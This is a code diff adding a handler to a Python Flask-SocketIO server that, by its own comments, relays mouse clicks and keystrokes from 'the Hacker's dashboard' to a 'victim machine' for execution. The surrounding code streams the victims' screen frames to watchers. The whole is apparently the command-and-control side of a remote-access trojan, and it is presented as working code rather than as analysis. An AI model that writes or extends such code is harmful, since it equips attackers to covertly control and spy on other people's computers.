@@ -80,6 +80,17 @@ def handle_video_frame(data):
         # Broadcast the frame to everyone in the "viewer_CLIENTID" room
         emit('new_frame', {'frame': frame}, room=f"viewer_{client_id}")
 
+@socketio.on('input_event')
+def handle_input_event(data):
+    """
+    Receives mouse clicks and keystrokes from the Hacker's dashboard
+    and routes them to the specific victim machine for execution.
+    """
+    client_id = data.get('client_id')
+    if client_id:
+        # Send the action down to the specific client payload
+        emit('execute_input', data, room=f"host_{client_id}")
+
 # ---------------------------------------------------------
 # WebSockets: Handling Browser Viewers (The "Watcher")
 # ---------------------------------------------------------
